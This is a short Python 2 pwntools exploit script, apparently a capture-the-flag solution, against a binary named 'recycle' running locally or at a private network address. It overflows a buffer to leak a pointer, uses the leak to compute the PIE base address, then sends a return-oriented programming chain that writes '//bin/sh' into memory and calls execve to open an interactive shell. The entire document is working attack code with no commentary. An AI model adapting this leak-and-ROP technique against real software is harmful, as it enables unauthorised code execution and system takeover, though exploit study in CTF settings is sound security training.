#!/usr/bin/env python2
from __future__ import print_function
from pwn import *
from struct import pack

context(os='linux', arch='x86_64')

if os.getenv('REMOTE'):
    p = remote('172.16.4.144', '3005')
else:
    p = process('./recycle')

p.send('A' * 40)

addr = u64((p.recv()[40:46].encode('hex') + '0000').decode('hex')) - 0x8B8

_p = lambda x : pack('Q', x)
rebase_0 = lambda x : _p(x + addr)
rop = ''
rop += rebase_0(0x0000000000000922)
rop += '//bin/sh'
rop += rebase_0(0x0000000000000923)
rop += rebase_0(0x0000000000201040)
rop += rebase_0(0x00000000000007dc)
rop += rebase_0(0x0000000000000922)
rop += _p(0x0000000000000000)
rop += rebase_0(0x0000000000000923)
rop += rebase_0(0x0000000000201048)
rop += rebase_0(0x00000000000007dc)
rop += rebase_0(0x0000000000000923)
rop += rebase_0(0x0000000000201040)
rop += rebase_0(0x0000000000000921)
rop += rebase_0(0x0000000000201048)
rop += _p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000007e0)
rop += rebase_0(0x0000000000201048)
rop += rebase_0(0x00000000000007e2)
rop += _p(0x000000000000003b)
rop += rebase_0(0x00000000000007e7)

p.send('A' * 40 + rop)
p.recv()
p.send('exit')

p.interactive()
